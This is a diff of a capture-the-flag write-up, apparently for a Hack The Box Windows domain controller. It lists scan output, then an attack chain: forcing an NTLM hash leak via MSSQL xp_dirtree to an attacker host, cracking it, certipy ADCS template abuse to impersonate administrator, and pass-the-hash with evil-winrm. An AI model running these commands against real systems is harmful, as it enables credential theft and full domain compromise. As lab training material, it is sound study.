@@ -1,3 +1,7 @@
+**Key Take Aways**
+* ADCS Attack
+* SMB Relay with MSSQL
+
 # Rust-Scan:
 ```
 Open 10.129.228.253:53
@@ -22,7 +26,7 @@ Open 10.129.228.253:49715
 ```
 
 # Nmap:
-
+```
 PORT      STATE SERVICE       REASON  VERSION
 53/tcp    open  domain        syn-ack Simple DNS Plus
 88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-04-13 18:13:41Z)
@@ -63,7 +67,7 @@ PORT      STATE SERVICE       REASON  VERSION
 49711/tcp open  msrpc         syn-ack Microsoft Windows RPC
 49715/tcp open  msrpc         syn-ack Microsoft Windows RPC
 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
-
+```
 # smbmap:
 
 		Sharename       Type      Comment
@@ -78,39 +82,44 @@ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 $ smbclient \\\\$IP\\Public -N -c
 
+```
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                   D        0  Sat Nov 19 17:21:25 2022
   ..                                  D        0  Sat Nov 19 17:21:25 2022
   SQL Server Procedures.pdf           A    49551  Fri Nov 18 19:09:43 2022
-
+```
 
 # MSSQL - SMB STEAL HASH:
 
+impacket-mssqlclient guestuser:passwd@$IP
+
 xp_dirtree '\\<attacker_IP>\any\thing'
 
-# Capture hash
+**Capture hash**
+
 sudo responder -I tun0
 
 hashcat -a 0 -m 5600  hash.txt /usr/share/wordlists/rockyou.txt
 
-evil-winrm -u sql_svc  -p '<password-cracked>'  -i $IP
+# User Own
+evil-winrm -u sql_svc  -p 'password-cracked'  -i $IP
 
 cd  C:/SQLServer/Logs
 
-type ERRORLOG.bak
+type ERRORLOG.bak (_Password Disclosed_)
 
-certipy-ad find -u Ryan.Cooper -p <password> -dc-ip $IP -text -stdout -vulnerable
+# Root Own
+certipy-ad find -u Ryan.Cooper -p password -dc-ip $IP -text -stdout -vulnerable
 
 
-certipy-ad req -u Ryan.Cooper -p <password> -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -debug
+certipy-ad req -u Ryan.Cooper -p password -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -debug
 
 
 sudo ntpdate $IP
 
 certipy-ad auth -pfx administrator.pfx -debug
 
-Got hash for 'administrator@sequel.htb': <hash>
+Got hash for 'administrator@sequel.htb': hash
 
-
-evil-winrm -i sequel.htb -u administrator -H '<hash>'
+evil-winrm -i sequel.htb -u administrator -H 'hash'
